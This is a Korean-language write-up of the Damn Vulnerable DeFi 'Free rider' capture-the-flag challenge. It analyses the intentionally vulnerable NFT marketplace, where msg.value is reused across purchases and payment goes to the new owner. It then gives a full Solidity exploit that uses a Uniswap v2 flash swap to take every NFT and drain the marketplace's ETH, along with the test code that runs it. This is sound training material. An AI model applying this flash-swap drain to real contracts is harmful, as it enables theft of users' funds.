https://teberr.notion.site/Damn-Vulnerable-Defi-Free-rider-930f754304314cada9b43f73b3fc9632

# 문제 소개

![문제.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c5cbaebb-9c83-43fd-a784-992408f71b55/%EB%AC%B8%EC%A0%9C.png)

문제 #10 - Free rider

새로운 Damn Valualbe NFT시장이 출시되었습니다. 6개의 NFT가 초기 발행되었고 각각 15 ETH입니다. 구매자가 비밀 alpha를 공유하여 시장이 취약해졌고 모든 토큰이 탈취될 위험이 생겼습니다. 하지만 아직 구매자는 방법을 모르고있어서 당신에게 NFT를 다 탈취해주면 45 ETH를 지불하겠다고 의뢰 합니다. 당신(해커)는 이 구매자의 의뢰를 받아 45ETH를 받고자 합니다. 아쉽게도 이를 수행하기 위해 현재 가지고 있는 자산은 0.5ETH 뿐입니다. 한순간이라도 잠깐 ETH를 얻을 수 있는 곳이 있다면 좋을텐데 말이죠.

# 초기세팅

test폴더의 free-rider.challenge.js 에서 초기 세팅을 살펴보자.

```tsx
let deployer, attacker, buyer;

    // The NFT marketplace will have 6 tokens, at 15 ETH each
    const NFT_PRICE = ethers.utils.parseEther('15')
    const AMOUNT_OF_NFTS = 6;
    const MARKETPLACE_INITIAL_ETH_BALANCE = ethers.utils.parseEther('90');

    // The buyer will offer 45 ETH as payout for the job
    const BUYER_PAYOUT = ethers.utils.parseEther('45');

    // Initial reserves for the Uniswap v2 pool
    const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther('15000');
    const UNISWAP_INITIAL_WETH_RESERVE = ethers.utils.parseEther('9000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker, buyer] = await ethers.getSigners();

        // Attacker starts with little ETH balance
        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x6f05b59d3b20000", // 0.5 ETH
        ]);

        // Deploy WETH contract
        this.weth = await (await ethers.getContractFactory('WETH9', deployer)).deploy();

        // Deploy token to be traded against WETH in Uniswap v2
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy Uniswap Factory and Router
        this.uniswapFactory = await (new ethers.ContractFactory(factoryJson.abi, factoryJson.bytecode, deployer)).deploy(
            ethers.constants.AddressZero // _feeToSetter
        );
        this.uniswapRouter = await (new ethers.ContractFactory(routerJson.abi, routerJson.bytecode, deployer)).deploy(
            this.uniswapFactory.address,
            this.weth.address
        );
        
        // Approve tokens, and then create Uniswap v2 pair against WETH and add liquidity
        // Note that the function takes care of deploying the pair automatically
        await this.token.approve(
            this.uniswapRouter.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await this.uniswapRouter.addLiquidityETH(
            this.token.address,                                         // token to be traded against WETH
            UNISWAP_INITIAL_TOKEN_RESERVE,                              // amountTokenDesired
            0,                                                          // amountTokenMin
            0,                                                          // amountETHMin
            deployer.address,                                           // to
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_WETH_RESERVE }
        );
        
        // Get a reference to the created Uniswap pair
        const UniswapPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer);
        this.uniswapPair = await UniswapPairFactory.attach(
            await this.uniswapFactory.getPair(this.token.address, this.weth.address)
        );
        expect(await this.uniswapPair.token0()).to.eq(this.weth.address);
        expect(await this.uniswapPair.token1()).to.eq(this.token.address);
        expect(await this.uniswapPair.balanceOf(deployer.address)).to.be.gt('0');

        // Deploy the marketplace and get the associated ERC721 token
        // The marketplace will automatically mint AMOUNT_OF_NFTS to the deployer (see `FreeRiderNFTMarketplace::constructor`)
        this.marketplace = await (await ethers.getContractFactory('FreeRiderNFTMarketplace', deployer)).deploy(
            AMOUNT_OF_NFTS,
            { value: MARKETPLACE_INITIAL_ETH_BALANCE }
        );

        // Deploy NFT contract
        const DamnValuableNFTFactory = await ethers.getContractFactory('DamnValuableNFT', deployer);
        this.nft = await DamnValuableNFTFactory.attach(await this.marketplace.token());

        // Ensure deployer owns all minted NFTs and approve the marketplace to trade them
        for (let id = 0; id < AMOUNT_OF_NFTS; id++) {
            expect(await this.nft.ownerOf(id)).to.be.eq(deployer.address);
        }
        await this.nft.setApprovalForAll(this.marketplace.address, true);

        // Open offers in the marketplace
        await this.marketplace.offerMany(
            [0, 1, 2, 3, 4, 5],
            [NFT_PRICE, NFT_PRICE, NFT_PRICE, NFT_PRICE, NFT_PRICE, NFT_PRICE]
        );
        expect(await this.marketplace.amountOfOffers()).to.be.eq('6');

        // Deploy buyer's contract, adding the attacker as the partner
        this.buyerContract = await (await ethers.getContractFactory('FreeRiderBuyer', buyer)).deploy(
            attacker.address, // partner
            this.nft.address, 
            { value: BUYER_PAYOUT }
        );
    });
```

WETH 와 DVT 토큰을 서로 교환할 수 있다. 유니스왑에서 weth는 9000개 토큰은 15000개로 되어 있으며 3:5비율임을 확인할 수 있다.

공격자인 attacker는 0.5이더를 가지고 있음을 알 수 있다.

deployer가 각각 토큰아이디가 0,1,2,3,4,5 인 NFT를 6개 생성하였다. 이 NFT는 Marketplace에서 각 15이더의 가격임을 알 수 있다.

MarketPlace에 90이더가 있음을 알 수 있다.

# 컨트랙트 코드 분석 및 공격 설계

## FreeRiderBuyer.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

/**
 * @title FreeRiderBuyer
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FreeRiderBuyer is ReentrancyGuard, IERC721Receiver {

    using Address for address payable;
    address private immutable partner;
    IERC721 private immutable nft;
    uint256 private constant JOB_PAYOUT = 45 ether;
    uint256 private received;

    constructor(address _partner, address _nft) payable {
        require(msg.value == JOB_PAYOUT);
        partner = _partner;
        nft = IERC721(_nft);
        IERC721(_nft).setApprovalForAll(msg.sender, true);
    }

    // Read https://eips.ethereum.org/EIPS/eip-721 for more info on this function
    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) 
        external
        override
        nonReentrant
        returns (bytes4) 
    {
        require(msg.sender == address(nft));
        require(tx.origin == partner);
        require(_tokenId >= 0 && _tokenId <= 5);
        require(nft.ownerOf(_tokenId) == address(this));
        
        received++;
        if(received == 6) {            
            payable(partner).sendValue(JOB_PAYOUT);
        }            

        return IERC721Receiver.onERC721Received.selector;
    }
}
```

onERC721Received 함수는 다음과 같다.

1. 이 함수를 호출한 주소가 nft의 주소여야하고
2. 호출한 근원 주소가 partner (attacker)여야 하며 
3. tokenId가 0~5여야한다.(발행된 NFT가 6개이므로)
4. tokenId에 맞는 NFT의 주인이 FreeRiderBuyer여야한다.

이 조건을 모두 통과하게 되면 received가 증가하게 되는데 이 값이 6이되면 partner에게 45이더를 보내게 된다.

## FreeRiderNFTMarketplace.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "../DamnValuableNFT.sol";

/**
 * @title FreeRiderNFTMarketplace
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FreeRiderNFTMarketplace is ReentrancyGuard {

    using Address for address payable;

    DamnValuableNFT public token;
    uint256 public amountOfOffers;

    // tokenId -> price
    mapping(uint256 => uint256) private offers;

    event NFTOffered(address indexed offerer, uint256 tokenId, uint256 price);
    event NFTBought(address indexed buyer, uint256 tokenId, uint256 price);
    
    constructor(uint8 amountToMint) payable {
        require(amountToMint < 256, "Cannot mint that many tokens");
        token = new DamnValuableNFT();

        for(uint8 i = 0; i < amountToMint; i++) {
            token.safeMint(msg.sender);
        }        
    }

    function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices) external nonReentrant {
        require(tokenIds.length > 0 && tokenIds.length == prices.length);
        for (uint256 i = 0; i < tokenIds.length; i++) {
            _offerOne(tokenIds[i], prices[i]);
        }
    }

    function _offerOne(uint256 tokenId, uint256 price) private {
        require(price > 0, "Price must be greater than zero");

        require(
            msg.sender == token.ownerOf(tokenId),
            "Account offering must be the owner"
        );

        require(
            token.getApproved(tokenId) == address(this) ||
            token.isApprovedForAll(msg.sender, address(this)),
            "Account offering must have approved transfer"
        );

        offers[tokenId] = price;

        amountOfOffers++;

        emit NFTOffered(msg.sender, tokenId, price);
    }

    function buyMany(uint256[] calldata tokenIds) external payable nonReentrant {
        for (uint256 i = 0; i < tokenIds.length; i++) {
            _buyOne(tokenIds[i]);
        }
    }

    function _buyOne(uint256 tokenId) private {       
        uint256 priceToPay = offers[tokenId];
        require(priceToPay > 0, "Token is not being offered");

        require(msg.value >= priceToPay, "Amount paid is not enough");

        amountOfOffers--;

        // transfer from seller to buyer
        token.safeTransferFrom(token.ownerOf(tokenId), msg.sender, tokenId);

        // pay seller
        payable(token.ownerOf(tokenId)).sendValue(priceToPay);

        emit NFTBought(msg.sender, tokenId, priceToPay);
    }    

    receive() external payable {}
}
```

FreeRiderMarketPlace 컨트랙트이다. 생성자로는 NFT를 발행하게 된다. 초기 발행한 NFT가 6개라고 하였으므로 6개의 NFT를 발행할 것이다.

```solidity

    function _offerOne(uint256 tokenId, uint256 price) private {
        require(price > 0, "Price must be greater than zero");

        require(
            msg.sender == token.ownerOf(tokenId),
            "Account offering must be the owner"
        );

        require(
            token.getApproved(tokenId) == address(this) ||
            token.isApprovedForAll(msg.sender, address(this)),
            "Account offering must have approved transfer"
        );

        offers[tokenId] = price;

        amountOfOffers++;

        emit NFTOffered(msg.sender, tokenId, price);
    }

    function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices) external nonReentrant {
        require(tokenIds.length > 0 && tokenIds.length == prices.length);
        for (uint256 i = 0; i < tokenIds.length; i++) {
            _offerOne(tokenIds[i], prices[i]);
        }
    }
```

_OfferOne 함수는 다음과 같이 진행된다.

1. 이 함수를 호출한 사람이 인자로 전달 해준 Id에 맞는 NFT의 주인이어야 한다.
2. NFT는 MarketPlace 컨트랙트에게 approved 되어있거나 이 함수를 호출한 msg.sender가 이 MarketPlace에 의해 approved 되어있어야 한다.
3. tokenId에 제안된 가격을 매핑하여 저장한다.
4. amountOfOffers 값을 1증가시킨다.

_OfferMany 함수는 외부에서 호출할 수 있는 함수이며 tokenId와 가격을 배열로 받아서 각 각_OfferOne함수를 실행시키는 함수이다.

```solidity
   function _buyOne(uint256 tokenId) private {       
        uint256 priceToPay = offers[tokenId];
        require(priceToPay > 0, "Token is not being offered");

        require(msg.value >= priceToPay, "Amount paid is not enough");

        amountOfOffers--;

        // transfer from seller to buyer
        token.safeTransferFrom(token.ownerOf(tokenId), msg.sender, tokenId);

        // pay seller
        payable(token.ownerOf(tokenId)).sendValue(priceToPay);

        emit NFTBought(msg.sender, tokenId, priceToPay);
    }    

     function buyMany(uint256[] calldata tokenIds) external payable nonReentrant {
        for (uint256 i = 0; i < tokenIds.length; i++) {
            _buyOne(tokenIds[i]);
        }
    }

}
```

buyMany 함수는 외부에서 호출이 가능한 함수이며 각 토큰Id 배열을 인자로 받아 그 토큰 Id를 인자로 하여 _buyOne 함수를 호출한다.

_buyOne 함수는 다음과 같이 진행된다.

1. tokenId에 일치하는 제안된 가격을 가져온다.
2. 제안된 가격은 0보다 커야하고
3. 전달받은 이더는 제안된 가격보다 크거나 같아야 한다.
4. amountOfOffers(제안된 횟수)를 감소시킨다.
5. NFT를 tokenId의 주인으로 부터 이 함수를 호출한 msg.sender에게 NFT를 보낸다.
6. NFT의 주인에게 제안된 가격만큼 이더를 보낸다.

여기서 문제가 되는 점은 두가지가 있다.

첫째로 보내진 이더의 값인 msg.value가 변하지 않는 다는 점이다. NFT를 구매하기 위하여 외부에서 호출할 수 있는 함수는 buyMany함수로 NFT를 여러개 살 수 있는데 이 때 보낸 NFT의 가격인 msg.value가 15라면 모든 NFT의 가격이 15이므로 모든 NFT에 대해 msg.value >= priceToPay 조건을 만족하여 전부 구매가 가능하다. 물론 이 컨트랙트에 이더가 존재하지 않아 받은 이더로만 NFT 주인에게 이더를 전달해주는 sendValue를 진행해야 한다면 이더가 부족하여 실패가 날것이다. 하지만 이 컨트랙트에는 90이더가 존재하기 때문에 15이더만 이 컨트랙트에 보내도 모든 NFT를 구매하며 90이더를 컨트랙트에서 NFT 주인에게 전송하도록 만들 수 있다.

둘째로 NFT 주인이 바뀐 후에 NFT 주인에게 이더를 지불한다는 것이 문제이다. 

![safetransferfrom.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/845c7992-fb63-43da-809c-004edecd0453/safetransferfrom.png)

msg.sender가 이더를 보내어 이 NFT를 사고나면 NFT의 주인이 되는데 NFTMarketPlace 컨트랙트에서는 NFT의 주인이 된 이후 NFT 주인에게 이더를 지불하므로 내가 나에게 돈을 지불하는 것이 되어 사실상 가스비만 제외하면 공짜로 살 수 있다.

그렇다면 15이더를 통하여 NFT를 전부 구매하면 되는데 문제는 공격자에게 초기 자금이 0.5이더밖에 없다. 이를 위하여 이더를 얻어야 하는데 이는 유니스왑v2에서 제공하는 Flash Swap 기능을 이용하면 된다.

### Flash Swap이란?

[https://velog.io/@wrjang96/Uniswap-Core](https://velog.io/@wrjang96/Uniswap-Core)  유니스왑 v2에 관한 내용

유니스왑 v2에서 제공하는 기능으로 플래시 론과 유사하게 사용자가 현재 토큰 잔액이 없어도 하나의 트랜잭션 내에서 풀에서 토큰을 자유롭게 빌린 후 트랜잭션이 종료되기 전에 수수료와 함께 상환할 수 있도록 하는 기능이다.

Uniswap Docs 에서 Flash Swap을 살펴보면 사실 모든 스왑은 내부적으로 플래시 스왑으로 이루어진다고 써져 있다. 이는 실제로 충분한 양의 토큰이 아직 입금이 되지 않았음에도 페어 컨트랙트에서 토큰을 보내준다는 것을 의미한다. 물론 트랜잭션이 끝날 때 컨트랙트가 충분한 양의 토큰이 입금이 안되어있으면 롤백할 수 있기 때문에 이런식으로 작동한다고 한다.

![swap.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f171a6d1-5317-4704-ab78-72b1c3f4a729/swap.png)

![uniswapV2Call.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6b1e0b17-66be-47e4-a88b-0ac1a408d7e8/uniswapV2Call.png)

[https://docs.uniswap.org/protocol/V2/reference/smart-contracts/pair](https://docs.uniswap.org/protocol/V2/reference/smart-contracts/pair)

[https://docs.uniswap.org/protocol/V2/concepts/core-concepts/flash-swaps](https://docs.uniswap.org/protocol/V2/concepts/core-concepts/flash-swaps)

일반적인 경우, 컨트랙트에서 플래시 스왑을 진행할 때, 유니스왑 Pair의 swap 함수를 호출하고 그에 따라서 내 컨트랙트의 UniswapV2Call 함수가 실행된다고 보면 된다.  따라서 UniswapV2Call에서 다음과 같이 공격을 구성하면 된다.

1. 빌린 15weth를 eth로 바꾼다.
2. MarketPlace에서 NFT를 전부 사들인다. (그러면 15이더를 보냈는데 90이더가 내 잔고에 있을 것)
3. NFT를 FreeRiderBuyer에게 보낸 후 의뢰 보상으로 45이더를 받는다(receive 함수 필요).
4. 수수료와 함께 빌린 이더를 수수료 포함 weth로 변환하여 유니스왑에 갚아주면 된다.

# 공격

먼저 유니스왑에서 flash swap을 통해 이더를 빌려서 NFT를 전부 구매한 후 buyer에게 전달하는 컨트랙트를 작성하자. [https://github.com/Uniswap/v2-periphery/blob/master/contracts/examples/ExampleFlashSwap.sol](https://github.com/Uniswap/v2-periphery/blob/master/contracts/examples/ExampleFlashSwap.sol) (flashSwap 사용예시 컨트랙트)

여기서 예시 컨트랙트는 IUniswapV2Callee.sol을 상속받고 있는데 열어보면

```solidity
pragma solidity >=0.5.0;

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}
```

로 uniswapV2Call을 받아오기 위함이다.

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "../DamnValuableNFT.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IFreeRiderNFTMarketplace{
        function buyMany(uint256[] calldata tokenIds) external payable;
}
interface IUniswapPair{
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}
interface IWETH {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract attackFreeRider is IUniswapV2Callee,IERC721Receiver{

    DamnValuableNFT public nft;
    IUniswapPair UniswapPair;
    address buyer;
    IFreeRiderNFTMarketplace market;
    IWETH weth;
    address attacker;
    constructor(address _nft, address _pair, address _buyer,address _market,address _weth){
        nft=DamnValuableNFT(_nft);
        UniswapPair=IUniswapPair(_pair);
        buyer=_buyer;
        market=IFreeRiderNFTMarketplace(_market);
        weth=IWETH(_weth);
        attacker=msg.sender;
    }
    function flash_swap()public{
        UniswapPair.swap(15 ether,0,address(this),hex"00"); // docs에서 data가 필요하지 않으면 길이 1 짜리 junk 바이트를 넣으면 알아서 무시된다고 써져있음.
    }
    function uniswapV2Call(address , uint , uint , bytes calldata) external override{
        uint256[] memory nftids = new uint256[](6);
        for(uint256 i=0;i<6;i++){
            nftids[i]=i;
        }
        weth.withdraw(15 ether);

        market.buyMany{value:15 ether}(nftids);

        for(uint i=0;i<6;i++){
            nft.safeTransferFrom(address(this), buyer, nftids[i]);
        }

        uint256 fee = 15 ether * 0.0031;
        weth.deposit{value: 15 ether + fee}();
        weth.transfer(msg.sender,15 ether + fee);
        payable(attacker).transfer(address(this).balance);
    }

    receive()external payable{}
    function onERC721Received(address, address, uint256, bytes memory) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
```

플래시 스왑을 하기 위하여 유니스왑페어의 스왑함수를 받아왔다.

![Pair_swap.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6e085f69-d149-4e48-9112-3026fd77cce4/Pair_swap.png)

swap 함수는 첫번째 인자와 두번째 인자로 두 토큰을 전부 주소 to에게 전달해준다. 이 때 마지막 인자인 data은 평범한 swap 거래와 구분하기 위한 인자이다. 이 data는 함수의 인자(얼마나 빌렸는지, 주소,매개변수) 등을 abi.encode를 통해 인코딩하여 data로 보내준다. 만약 이러한 정보들을 보낼필요가 없다면 길이가 1인 아무 값이나 넣어주면 된다. 안넣어주면 flash swap이 아닌 일반 스왑으로 인지하기 때문이다. 그래서 hex”00”을 넣어주었다.

플래시 스왑을 통해 15이더를 받으면 다음과 같이 진행된다.

1. 플래시 스왑을 통해 받은 15weth를 이더로 바꾼다.
2. 마켓에서 15이더를 기반으로 모든 nft를 구매한다.
3. 구매한 nft를 의뢰를 맡긴 buyer에게 전송한다.
4. 플래시 스왑을 통해 받은 15이더의 수수료를 계산하여 weth로 변환한다.
5. 빌린 만큼 값는다. 
6. 공격자에게 남은 이더 만큼 전송한다.

수수료를 계산하기 위해 DOCS를 참고하면

![수수료.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6f3fc4ea-4f46-4ab0-a294-83d8cf709749/%EC%88%98%EC%88%98%EB%A3%8C.png)

약 빌린양의 0.31%를 수수료로 내야하므로 15이더의 0.0031만큼 수수료로 계산해줬다.

그리고 onERC721Received 함수가 없으면 nft를 구매하여 이 컨트랙트로 가져올 수 없으므로 IERC721Received를 상속받아 onERC721Received 함수를 만들어주었다.

test 폴더의 free-rider.challenge.js에서 테스트를 통해 공격을 진행하자.

```tsx
// Get compiled Uniswap v2 data
const pairJson = require("@uniswap/v2-core/build/UniswapV2Pair.json");
const factoryJson = require("@uniswap/v2-core/build/UniswapV2Factory.json");
const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json");

const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Free Rider', function () {
    let deployer, attacker, buyer;

    // The NFT marketplace will have 6 tokens, at 15 ETH each
    const NFT_PRICE = ethers.utils.parseEther('15')
    const AMOUNT_OF_NFTS = 6;
    const MARKETPLACE_INITIAL_ETH_BALANCE = ethers.utils.parseEther('90');

    // The buyer will offer 45 ETH as payout for the job
    const BUYER_PAYOUT = ethers.utils.parseEther('45');

    // Initial reserves for the Uniswap v2 pool
    const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther('15000');
    const UNISWAP_INITIAL_WETH_RESERVE = ethers.utils.parseEther('9000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker, buyer] = await ethers.getSigners();

        // Attacker starts with little ETH balance
        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x6f05b59d3b20000", // 0.5 ETH
        ]);

        // Deploy WETH contract
        this.weth = await (await ethers.getContractFactory('WETH9', deployer)).deploy();

        // Deploy token to be traded against WETH in Uniswap v2
        this.token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy Uniswap Factory and Router
        this.uniswapFactory = await (new ethers.ContractFactory(factoryJson.abi, factoryJson.bytecode, deployer)).deploy(
            ethers.constants.AddressZero // _feeToSetter
        );
        this.uniswapRouter = await (new ethers.ContractFactory(routerJson.abi, routerJson.bytecode, deployer)).deploy(
            this.uniswapFactory.address,
            this.weth.address
        );
        
        // Approve tokens, and then create Uniswap v2 pair against WETH and add liquidity
        // Note that the function takes care of deploying the pair automatically
        await this.token.approve(
            this.uniswapRouter.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await this.uniswapRouter.addLiquidityETH(
            this.token.address,                                         // token to be traded against WETH
            UNISWAP_INITIAL_TOKEN_RESERVE,                              // amountTokenDesired
            0,                                                          // amountTokenMin
            0,                                                          // amountETHMin
            deployer.address,                                           // to
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_WETH_RESERVE }
        );
        
        // Get a reference to the created Uniswap pair
        const UniswapPairFactory = new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer);
        this.uniswapPair = await UniswapPairFactory.attach(
            await this.uniswapFactory.getPair(this.token.address, this.weth.address)
        );
        expect(await this.uniswapPair.token0()).to.eq(this.weth.address);
        expect(await this.uniswapPair.token1()).to.eq(this.token.address);
        expect(await this.uniswapPair.balanceOf(deployer.address)).to.be.gt('0');

        // Deploy the marketplace and get the associated ERC721 token
        // The marketplace will automatically mint AMOUNT_OF_NFTS to the deployer (see `FreeRiderNFTMarketplace::constructor`)
        this.marketplace = await (await ethers.getContractFactory('FreeRiderNFTMarketplace', deployer)).deploy(
            AMOUNT_OF_NFTS,
            { value: MARKETPLACE_INITIAL_ETH_BALANCE }
        );

        // Deploy NFT contract
        const DamnValuableNFTFactory = await ethers.getContractFactory('DamnValuableNFT', deployer);
        this.nft = await DamnValuableNFTFactory.attach(await this.marketplace.token());

        // Ensure deployer owns all minted NFTs and approve the marketplace to trade them
        for (let id = 0; id < AMOUNT_OF_NFTS; id++) {
            expect(await this.nft.ownerOf(id)).to.be.eq(deployer.address);
        }
        await this.nft.setApprovalForAll(this.marketplace.address, true);

        // Open offers in the marketplace
        await this.marketplace.offerMany(
            [0, 1, 2, 3, 4, 5],
            [NFT_PRICE, NFT_PRICE, NFT_PRICE, NFT_PRICE, NFT_PRICE, NFT_PRICE]
        );
        expect(await this.marketplace.amountOfOffers()).to.be.eq('6');

        // Deploy buyer's contract, adding the attacker as the partner
        this.buyerContract = await (await ethers.getContractFactory('FreeRiderBuyer', buyer)).deploy(
            attacker.address, // partner
            this.nft.address, 
            { value: BUYER_PAYOUT }
        );
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker must have earned all ETH from the payout
        expect(await ethers.provider.getBalance(attacker.address)).to.be.gt(BUYER_PAYOUT);
        expect(await ethers.provider.getBalance(this.buyerContract.address)).to.be.eq('0');

        // The buyer extracts all NFTs from its associated contract
        for (let tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
            await this.nft.connect(buyer).transferFrom(this.buyerContract.address, buyer.address, tokenId);
            expect(await this.nft.ownerOf(tokenId)).to.be.eq(buyer.address);
        }

        // Exchange must have lost NFTs and ETH
        expect(await this.marketplace.amountOfOffers()).to.be.eq('0');
        expect(
            await ethers.provider.getBalance(this.marketplace.address)
        ).to.be.lt(MARKETPLACE_INITIAL_ETH_BALANCE);
    });
})
```

만든 컨트랙트를 배포하고 flash_swap을 실행해주면 된다.

```tsx
it('Exploit', async function () {
        const SolutionPoolFactory = await ethers.getContractFactory('attackFreeRider',attacker);
        this.sol = await SolutionPoolFactory.deploy(
            this.nft.address,
            this.uniswapPair.address,
            this.buyerContract.address,
            this.marketplace.address,
            this.weth.address);

        this.sol.connect(attacker).flash_swap()
        
    });
```

![성공.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c63840d2-740c-46fe-a475-1cb52a693d1f/%EC%84%B1%EA%B3%B5.png)

npm run free-rider를 통하여 Exploit이 성공적으로 진행되어 문제의 목표를 달성한 것을 확인할 수 있다.
